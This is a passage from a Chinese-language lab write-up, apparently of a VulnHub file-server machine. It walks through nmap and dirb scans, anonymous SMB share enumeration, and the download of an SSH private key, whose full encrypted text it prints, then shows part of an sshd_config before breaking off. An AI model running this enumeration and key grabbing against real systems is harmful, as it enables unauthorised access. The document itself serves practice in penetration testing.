-oN nmap.sP</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:59 EDT</span><br><span class="line">Nmap scan report for 192.168.1.1</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.20</span><br><span class="line">Host is up (0.000063s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:E6:6D (VMware)</span><br><span class="line">Nmap scan report for 192.168.1.10</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.04 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-端口扫描"><a href="#0x02-端口扫描" class="headerlink" title="0x02.端口扫描"></a>0x02.端口扫描</h2><p><code>得到以下端口，可以看到ftp端口允许anonymous登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# nmap -sC -sV -sT 192.168.1.14 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 16:09 EDT</span><br><span class="line">Nmap scan report for 192.168.1.14</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)</span><br><span class="line">|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)</span><br><span class="line">|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.6 ((CentOS))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS)</span><br><span class="line">|_http-title: My File Server</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind                                                                                                                   </span><br><span class="line">|   100000  3,4          111/udp6  rpcbind                                                                                                                   </span><br><span class="line">|   100003  3,4         2049/tcp   nfs                                                                                                                       </span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      20048/tcp   mountd</span><br><span class="line">|   100005  1,2,3      20048/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      20048/udp   mountd</span><br><span class="line">|   100005  1,2,3      20048/udp6  mountd</span><br><span class="line">|   100021  1,3,4      43810/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      44598/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      47781/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      52409/udp   nlockmgr</span><br><span class="line">|   100024  1          35697/tcp6  status</span><br><span class="line">|   100024  1          38764/tcp   status</span><br><span class="line">|   100024  1          40593/udp6  status</span><br><span class="line">|   100024  1          54638/udp   status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)</span><br><span class="line">2049/tcp open  nfs_acl     3 (RPC #100227)</span><br><span class="line">2121/tcp open  ftp         ProFTPD 1.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx   3 root     root           16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">MAC Address: 00:0C:29:D5:67:2B (VMware)</span><br><span class="line">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1h49m53s, deviation: 3h10m19s, median: 0s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.1)</span><br><span class="line">|   Computer name: localhost</span><br><span class="line">|   NetBIOS computer name: FILESERVER\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: localhost</span><br><span class="line">|_  System time: 2020-09-26T01:39:56+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-09-25T20:09:36</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 58.30 seconds</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>仅仅是一个静态页面，且可以重定向到一个网站</code></p><img src="/2020/09/26/CK-03/image-20200925201803610.png" class><h2 id="0x04-扫描目录"><a href="#0x04-扫描目录" class="headerlink" title="0x04.扫描目录"></a>0x04.扫描目录</h2><p><code>得到.ssh目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# dirb http://192.168.1.14</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Fri Sep 25 16:26:08 2020</span><br><span class="line">URL_BASE: http://192.168.1.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line">---- Scanning URL: http://192.168.1.14/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.14/.ssh/</span><br><span class="line">+ http://192.168.1.14/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.1.14/index.html (CODE:200|SIZE:174)                              </span><br><span class="line">---- Entering directory: http://192.168.1.14/.ssh/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Sep 25 16:26:12 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x05-浏览-ssh目录"><a href="#0x05-浏览-ssh目录" class="headerlink" title="0x05.浏览.ssh目录"></a>0x05.浏览.ssh目录</h2><p><code>发现两个文件，第一个为公钥，第二个为私钥，但拒绝访问</code></p><img src="/2020/09/26/CK-03/image-20200925202904665.png" class><p><code>浏览文件</code></p><img src="/2020/09/26/CK-03/image-20200925203157919.png" class><img src="/2020/09/26/CK-03/image-20200925203239246.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCaOJE+/p4Y988V1I/soMH5RgdIavic3jBph74ZSUGWCf9I8mdmA6BszNd/QIxSbCXufb8r/yPMuoTDetJNXHyvb3RvPsSQ86N12G+ZaQATcGdf67S8WB+9vGJAPRxbbZiaokBjNXkGvAXs2mDhhtgiNjbnn3fb4KNvdeNJ/+xhZCRwknmKtf55zMgv2kFXFfmJO0kVogVYncnmsNohd0wJuImDJVHuGqvg9KmFCjb/gMhfh0jTIZB7cuseaKAzY8O2g4tMRNyVG5zwAmHkH0D00Du6ssXn1ZMCRq/imdDV7It1+L14d6bDTRCqm2FLRcKcx5PohJC1ElnzTkvhalEx smbuser@FileServer_CK10-test</span><br></pre></td></tr></table></figure><h2 id="0x06-浏览SMB服务器端所分享出来的所有资源"><a href="#0x06-浏览SMB服务器端所分享出来的所有资源" class="headerlink" title="0x06.浏览SMB服务器端所分享出来的所有资源"></a>0x06.浏览SMB服务器端所分享出来的所有资源</h2><p><code>可以发现两个目录为smbdata、smbuser，同时也是两个用户</code></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtYmEub3JnL3NhbWJhL2RvY3MvY3VycmVudC9tYW4taHRtbC9zbWJjbGllbnQuMS5odG1s">smbclient参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient -L 192.168.1.14</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        smbdata         Disk      smbdata</span><br><span class="line">        smbuser         Disk      smbuser</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.9.1)</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x07-登入到服务端"><a href="#0x07-登入到服务端" class="headerlink" title="0x07.登入到服务端"></a>0x07.登入到服务端</h2><p><code>smbdata可以查看，smbuser不可以查看</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbdata</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Mar 19 00:53:12 2020</span><br><span class="line">  ..                                  D        0  Tue Feb 18 06:47:54 2020</span><br><span class="line">  anaconda                            D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  audit                               D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  boot.log                            N     6120  Tue Feb 18 06:48:16 2020</span><br><span class="line">  btmp                                N      384  Tue Feb 18 06:48:16 2020</span><br><span class="line">  cron                                N     4813  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg                               N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  glusterfs                           D        0  Tue Feb 18 06:48:16 2020</span><br><span class="line">  lastlog                             N   292292  Tue Feb 18 06:48:16 2020</span><br><span class="line">  maillog                             N     1982  Tue Feb 18 06:48:16 2020</span><br><span class="line">  messages                            N   684379  Tue Feb 18 06:48:17 2020</span><br><span class="line">  ppp                                 D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  samba                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  secure                              N    11937  Tue Feb 18 06:48:17 2020</span><br><span class="line">  spooler                             N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tallylog                            N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tuned                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  wtmp                                N    25728  Tue Feb 18 06:48:17 2020</span><br><span class="line">  xferlog                             N      100  Tue Feb 18 06:48:17 2020</span><br><span class="line">  yum.log                             N    10915  Tue Feb 18 06:48:17 2020</span><br><span class="line">  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020</span><br><span class="line">  todo                                N      162  Tue Feb 25 09:22:29 2020</span><br><span class="line">  id_rsa                              N     1766  Thu Mar 19 00:43:16 2020</span><br><span class="line">  note.txt                            N      128  Thu Mar 19 00:53:12 2020</span><br><span class="line"></span><br><span class="line">                19976192 blocks of size 1024. 18256884 blocks available</span><br><span class="line">smb: \&gt;</span><br><span class="line">root@JIYE:~/vulnhub/ck00# smbclient \\\\192.168.1.14\\smbuser</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line">Anonymous login successful</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><p><code>下载id_rsa与sshd_config</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get id_rsa</span><br><span class="line">getting file \id_rsa of size 1766 as id_rsa (143.7 KiloBytes/sec) (average 143.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get sshd_config</span><br><span class="line">getting file \sshd_config of size 3906 as sshd_config (1907.1 KiloBytes/sec) (average 395.6 KiloBytes/sec)</span><br></pre></td></tr></table></figure><p><code>查看私钥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id_rsa  nmap.CVT  nmap.sP  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat id_rsa </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,0111C403C183156C592743C68EA855BD</span><br><span class="line"></span><br><span class="line">TRNiuBMH2lIgWgYpBb4MgbhQtW84gdUTJDRQLp/qwBv/KTbycWu+R07J2lGEFJH8</span><br><span class="line">8G1nZ+bjnPayjTyywY5PGySQ4k5pWvmNin16TEAII7XO6Jv+/Ev/N4sPdKe7K3bN</span><br><span class="line">TpJ39S5DVuj4oTTswvUp3dYU6ynu3Qp9PBRdBJnazbK5hwkxOyqa5l1dCfRDpaWf</span><br><span class="line">hPM+GhXbHOvzj+Z9wvlrTuPASsBrCnXd/MAxRmNfDMCHlPHVATEChoP89awwoti5</span><br><span class="line">itxcxqIWGIqilnlm7Dcy2lynE7LlXdXyJAnUI0Plra9PTqC4QoJL3Lyesypzp9Xk</span><br><span class="line">kB9Hv25vherfgjy6AKBcIqZuALtFL2mij7nYC21XxcDudKCaB+UxOQhGBLNN0E16</span><br><span class="line">7bNvnKebLmhyWhDNVaelvF9cd+mxvvPzv5ljhUd3jvhhyU70AgzrpF1ZUxVh2GOs</span><br><span class="line">huzbtCIwX3I+xAQYdw+sThTRG8GcXLjreEUF4gJqlPNWk9gxH/AmfTmGKdLhhoSb</span><br><span class="line">/7wHeMvLwSRaVv6fyPXhPpiB5c3MHCoHFYi6sbmmtYXJBum9fF9iubIzlRu/4vZ2</span><br><span class="line">irmnsEff3vkqqPchb6M0zMtw80QPJgpjhclJjDPiI5P1DWjgLNYOQba0nKNQ3RFa</span><br><span class="line">iy2lup+EsCqWU0KTI+hH+Xm0YAq2/ESqPeNp/U+78y8L5JkpavRYNJyx+vGV8XPP</span><br><span class="line">dGkZD8x68xLIwF6/urZC6utRa1HgyEDIcUbyTUnbRkLUFWbN9eHLrY0pH+zhKJOj</span><br><span class="line">14cUAOpB9RkxAoE6YJ03vJq72OoxfCYhiv3fj4pQRuQJwA2c8IfgdwIJqBIMVPvV</span><br><span class="line">5HX3j5ugkyocLl5Rg+oXjyhNczmABJehk9gA0eCcfQpXGPw/OBMJ4BJdUHxbCOtQ</span><br><span class="line">lAstu+fNBosFhkj3lHXX/ZNIKcYs9+Mvs3E2DvmcK7Us/59qsCwHRZNvd2E3EF9r</span><br><span class="line">nNuHg8sY5HxMvMNH46PH8c4EesuNvOW2pvaCHCT5Id3Up1yyP09hoxyyovnPQ/Gj</span><br><span class="line">HXffEjkc82t9Ip476mfo0NBzB4g7sOb4ZXhG8RxHS4d83S5bITzHP8RrlmkdKCjH</span><br><span class="line">U5YMap/xQ++4XTtgX8DjVoZw1imRtNsCQk6fe0UVKzg2nFV8rkOU8A1o6NDcjE/Z</span><br><span class="line">V/PsYJT3CTEvlzq1/4lLQN2nLrpwmlu+Ate5CEmKxqDIpSIzQBl5N4cU5aa/L1XG</span><br><span class="line">2nFA4H1Ipo7CaUQZ3lQGC/wHaWcP0KnZQ/SrInGOQVu1RJe3MhyG3TyC06FVfmgV</span><br><span class="line">m4oqf39lGQlYX8+cTCK8w6nI6gnSsW92U9j5s9iGEZKN2bI1poyurQaExFiDub6m</span><br><span class="line">QzYWqY1+EUBUYzFMlR08TeHXLvoAmgJNcnZlhXuhWsl6z95UMKvRBLN3Dc4kIVZx</span><br><span class="line">sBZmlYhqhwl0AWYQOl1tJrOMiqLeMhF+xWZ3J/iZ9Pj37Dz9xL8YiA8YUNC/NqT+</span><br><span class="line">3j1s3USXPL0uyxS7tnJJf3aXMBi0XwwHWZg4ii8JQhGiiPhGBE9lpRyPhYCx3xDC</span><br><span class="line">ED/GW22/sWS5fhDr4tynP8VdjiFwbBEcXYHa84XjeUZZaLJQTSwnE/afWVYty8AX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# cat sshd_config </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#      $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the sshd server system-wide configuration file.  See</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sshd_config(5) <span class="keyword">for</span> more information.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This sshd was compiled with PATH=/usr/<span class="built_in">local</span>/bin:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The strategy used <span class="keyword">for</span> options <span class="keyword">in</span> the default sshd_config shipped with</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> OpenSSH is to specify options with their default value <span class="built_in">where</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> possible, but leave them commented.  Uncommented options override the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> default value.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want to change the port on a SELinux system, you have to tell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> SELinux about this change.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> semanage port -a -t ssh_port_t -p tcp <span class="comment">#PORTNUMBER</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Port 22</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AddressFamily any</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ListenAddress ::</span></span><br><span class="line"></span><br><span class="line">HostKey /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="meta">#</span><span class="bash">HostKey /etc/ssh/ssh_host_dsa_key</span></span><br><span class="line">HostKey /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">HostKey /etc/ssh/ssh_host_ed25519_key</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ciphers and keying</span></span><br><span class="line"><span class="meta">#</span><span class="bash">RekeyLimit default none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging</span></span><br><span class="line"><span class="meta">#</span><span class="bash">SyslogFacility AUTH</span></span><br><span class="line">SyslogFacility AUTHPRIV</span><br><span class="line"><span class="meta">#</span><span class="bash">LogLevel INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Authentication:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">LoginGraceTime 2m</span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta">#</span><span class="bash">StrictModes yes</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxAuthTries 6</span></span><br><span class="line"><span class="meta">#</span><span class="bash">MaxSessions 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">PubkeyAuthentication yes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> but this is overridden so installations will only check .ssh/authorized_keys</span></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedPrincipalsFile none</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">AuthorizedKeysCommand none</span></span><br><span class="line"><span class="meta">#</span><span 